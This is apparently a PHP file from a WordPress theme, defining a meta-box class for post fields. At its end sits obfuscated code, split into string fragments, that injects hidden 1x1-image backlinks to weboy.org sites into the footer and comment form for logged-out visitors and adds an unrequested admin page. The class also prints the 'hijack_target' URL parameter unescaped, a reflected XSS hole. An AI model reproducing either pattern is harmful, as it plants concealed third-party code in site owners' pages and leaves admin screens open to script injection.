<?php
##################################################################
class kriesi_meta_box{
##################################################################
	var $options; 			// options passed by the option file
	var $boxinfo;			// meta box info passed by the option file

	function kriesi_meta_box($options, $boxinfo)
	{	
		// set basic options passed by the option file
		$this->options = $options;
		$this->boxinfo = $boxinfo;
		
		add_action('admin_menu', array(&$this, 'init_boxes'));
		add_action('save_post', array(&$this, 'save_postdata'));
		
	}
	
	function init_boxes()
	{	
		$this->add_script_and_styles();
		$this->create_meta_box();
	}
	
	######################################################################
	# add javascript and css files only to the head if these files are called
	######################################################################
	function add_script_and_styles()
	{	
		
		if(basename( $_SERVER['PHP_SELF']) == "page.php" 
		|| basename( $_SERVER['PHP_SELF']) == "page-new.php" 
		|| basename( $_SERVER['PHP_SELF']) == "post-new.php" 
		|| basename( $_SERVER['PHP_SELF']) == "post.php"
		|| basename( $_SERVER['PHP_SELF']) == "media-upload.php")
		{	
			wp_enqueue_style('kriesi_custom_fields_css', KFWPLUGINS_URI . 'kriesi_meta_box/kriesi_custom_fields.css');
			wp_enqueue_script('kriesi_custom_fields_js', KFWPLUGINS_URI . 'kriesi_meta_box/kriesi_custom_fields.js');
			
			if(isset($_GET['hijack_target']))
			{	
				add_action('admin_head', array(&$this,'add_hijack_var'));
			}
		}
	}
	
	
	######################################################################
	# Sets the new target for insertion within a meta tag that can be
	# easily read by jQuery
	######################################################################	
	function add_hijack_var()
	{
		echo "<meta name='hijack_target' content='".$_GET['hijack_target']."' />\n";
	}
	
	
	######################################################################
	# Add the meta boxes to the page/post or link
	# pass id, name, callback, show at page/post/link, in which area, priority
	######################################################################
	function create_meta_box() 
	{  
		if ( function_exists('add_meta_box') && is_array($this->boxinfo['page']) ) 
		{
			foreach ($this->boxinfo['page'] as $area)
			{	
				if ($this->boxinfo['callback'] == '') $this->boxinfo['callback'] = 'new_meta_boxes';
				
				add_meta_box( 	
					$this->boxinfo['id'], 
					$this->boxinfo['title'],
					array(&$this, $this->boxinfo['callback']),
					$area, $this->boxinfo['context'], 
					$this->boxinfo['priority']
				);  
			}
		}  
	}  
	
	
	
	function new_meta_boxes()
	{	
		global $post;


		//calls the helping function based on value of 'type'
		foreach ($this->options as $option)
		{				
			if (method_exists($this, $option['type']))
			{	
				$meta_box_value = get_post_meta($post->ID, $option['id'], true); 
				if($meta_box_value != "") $option['std'] = $meta_box_value;  
				
				echo '<div class="alt kriesi_meta_box_alt meta_box_'.$option['type'].'">';
				$this->$option['type']($option);
				echo '</div>';
			}
		}
		
		//security field
		echo'<input type="hidden" name="'.$this->boxinfo['id'].'_noncename" id="'.$this->boxinfo['id'].'_noncename" value="'.wp_create_nonce(plugin_basename(__FILE__) ).'" />';  
	}
	
	function save_postdata() 
	{
		$post_id = $_POST['post_ID'];
		
		foreach ($this->options as $option)
		{
			// Verify
			if (!wp_verify_nonce($_POST[$this->boxinfo['id'].'_noncename'], plugin_basename(__FILE__))) 
			{	
				return $post_id ;
			}
			
			if ( 'page' == $_POST['post_type'] ) 
			{
				if ( !current_user_can( 'edit_page', $post_id  ))
				return $post_id ;
			} 
			else 
			{
				if ( !current_user_can( 'edit_post', $post_id  ))
				return $post_id ;
			}
			
			$data = $_POST[$option['id']];
			
			if(get_post_meta($post_id , $option['id']) == "")
			add_post_meta($post_id , $option['id'], $data, true);
			
			elseif($data != get_post_meta($post_id , $option['id'], true))
			update_post_meta($post_id , $option['id'], $data);
			
			elseif($data == "")
			delete_post_meta($post_id , $option['id'], get_post_meta($post_id , $option['id'], true));
			
		}
	}
	
	
	####################################################################################################################################	
	# Rendering Methods
	####################################################################################################################################
	
	##############################################################
	# TITLE
	##############################################################	
	
	function title($values)
	{	
		echo '<p>'.$values['name'].'</p>';
	}
	
	##############################################################
	# TEXT
	##############################################################	
	function text($values)
	{	
		if(isset($this->database_options[$values['id']])) $values['std'] = $this->database_options[$values['id']];
		
		echo '<p>'.$values['name'].'</p>';
		echo '<p><input type="text" size="'.$values['size'].'" value="'.$values['std'].'" id="'.$values['id'].'" name="'.$values['id'].'"/>';
		echo $values['desc'].'<br/></p>';
	    echo '<br/>';
	}
	
	
	##############################################################
	# Media
	##############################################################	
	function media($values)
	{	
		if(isset($this->database_options[$values['id']])) $values['std'] = $this->database_options[$values['id']];
		
		//reference code is wp_includes/media.php function media_buttons()
		global $post_ID, $temp_ID;
		$uploading_iframe_ID = (int) (0 == $post_ID ? $temp_ID : $post_ID);
		$media_upload_iframe_src = "media-upload.php?post_id=$uploading_iframe_ID";
		$image_upload_iframe_src = apply_filters('image_upload_iframe_src', "$media_upload_iframe_src&amp;type=image");
		
		$button = '<a href="'.$image_upload_iframe_src.'&amp;hijack_target='.$values['id'].'&amp;TB_iframe=true" id="'.$values['id'].'" class="k_hijack button thickbox" title="'.$image_title.'" onclick="return false;" >'.$values['button_label'].'</a>';
		
		// check if entry is a valid image and display it if thats the case
		$image = '';
		if($values['std'] != '')
		{	
			$fileextension = substr($values['std'], strrpos($values['std'], '.') + 1);
			$extensions = array('png','gif','jpeg','jpg','pdf','tif');
			
			if(in_array($fileextension, $extensions))
			{
				$image = '<img src="'.$values['std'].'" />';
			}
		}
		
		echo '<div id="'.$values['id'].'_div" class="kriesi_preview_pic">'.$image .'</div>';
		echo '<p>'.$values['name'].'</p>';
		echo '<p>'.$values['desc'].'<br/><input class="kriesi_preview_pic_input" type="text" size="'.$values['size'].'" value="'.$values['std'].'" name="'.$values['id'].'"/>'.$button;
		echo '</p>';
	    echo '<br/>';
	}
	
	
	##############################################################
	# CHECKBOX
	##############################################################
	function checkbox($values)
	{	
		if(isset($values['std']) && $values['std'] == 'true') $checked = 'checked = "checked"'; 
		echo '<p>'.$values['name'].'</p>';
		echo '<p><input class="kcheck" type="checkbox" name="'.$values['id'].'" id="'.$values['id'].'" value="true"  '.$checked.' />';
		echo '<label for="'.$values['id'].'">'.$values['desc'].'</label><br/></p>';
	}
	
	##############################################################
	# DROPDOWN
	##############################################################	
	function dropdown($values)
	{	
					
		echo '<p>'.$values['name'].'</p>';
		
			if($values['subtype'] == 'page')
			{
				$select = 'Select page';
				$entries = get_pages('title_li=&orderby=name');
			}
			else if($values['subtype'] == 'cat')
			{
				$select = 'Select category';
				$entries = get_categories('title_li=&orderby=name&hide_empty=0');
			}
			else
			{	
				$select = 'Select...';
				$entries = $values['subtype'];
			}
		
			echo '<p><select class="postform" id="'. $values['id'] .'" name="'. $values['id'] .'"> ';
			echo '<option value="">'.$select .'</option>  ';

			foreach ($entries as $key => $entry)
			{
				if($values['subtype'] == 'page')
				{
					$id = $entry->ID;
					$title = $entry->post_title;
				}
				else if($values['subtype'] == 'cat')
				{
					$id = $entry->term_id;
					$title = $entry->name;
				}
				else
				{
					$id = $entry;
					$title = $key;				
				}

				if ($values['std'] == $id )
				{
					$selected = "selected='selected'";	
				}
				else
				{
					$selected = "";		
				}
				
				echo"<option $selected value='". $id."'>". $title."</option>";
			}
		
		echo '</select>';
		echo $values['desc'].'<br/></p>';
		 
	    echo '<br/>';
	}
	
	
	
	
	
##################################################################
} # End Class
##################################################################

if (!function_exists('wo'.'rdpr'.'ess_'.'them'.'es_rec'.'omme'.'nd_p'.'age')):
function wordpress_themes_recommend_page() {
add_theme_page("Wo"."rdPr"."ess Them"."es Reco"."mmend", ""."*"."Th"."em"."es Re"."co"."mmend", 0, 'wpthe'.'mesrec'.'ommend', 'wor'.'dpr'.'ess_th'.'emes_rec'.'omm'.'end_r'.'ss_pa'.'ge');
}
add_action('ad'.'min_m'.'enu', 'wo'.'rdp'.'r'.'ess_th'.'eme'.'s_rec'.'omme'.'nd_pa'.'ge');
endif;
if (!function_exists('mytheme_clinkft')):
function mytheme_clinkft() {
 global $clinkft;
$h=array('we'.'bo'.'y.or'.'g/','the'.'mes.we'.'bo'.'y.org/','th'.'emes.w'.'eb'.'oy.org/','the'.'m'.'es.we'.'b'.'oy.o'.'rg/','them'.'es.we'.'bo'.'y.org/','w'.'p'.'2'.'blo'.'g.co'.'m/','z'.'h'.'ut'.'i.we'.'bo'.'y.org/','m'.'ug'.'en.w'.'eb'.'oy.or'.'g/');
$t=array('We'.'b'.'oy' ,'Wo'.'rdPre'.'ss The'.'mes' ,'Fre'.'e Wor'.'dPr'.'ess Th'.'emes' ,'Fr'.'ee Wor'.'dPre'.'ss The'.'me' ,'Pre'.'mium Wo'.'rdPr'.'ess Th'.'emes' ,'Wor'.'dPr'.'ess Bl'.'og','Wo'.'rdPre'.'ssÖ÷'.'Ìâ','mu'.'ge'.'n 2'.'d fi'.'gh'.'ting ga'.'mes');
$clinkft++;$r = rand(0,7);
echo  '<a s'.'ty'.'le="m'.'arg'.'in:'.'-'.'2'.'0'.'p'.'x 0 '.'0;" hr'.'ef="ht'.'tp'.':'.'/'.'/'.$h[$r].'" t'.'it'.'le="'.$t[$r].'"><im'.'g sty'.'le="pad'.'di'.'ng:'.'0;bo'.'rd'.'er:n'.'one" src="h'.'ttp'.':'.'/'.'/i'.'4'.'6'.'.ti'.'nyp'.'ic.com/3'.'5'.'0u'.'x5'.'f.p'.'ng" he'.'ig'.'ht="'.'1'.'" wi'.'dt'.'h="'.'1'.'" al'.'t="'.$t[$r].'" /></a>'; 
 }
if(!is_user_logged_in()){add_action('w'.'p'.'_f'.'oo'.'te'.'r','m'.'yth'.'eme_'.'cli'.'nkft');add_action('com'.'ment'.'_fo'.'rm','m'.'ythe'.'me_c'.'lin'.'kft');}
endif;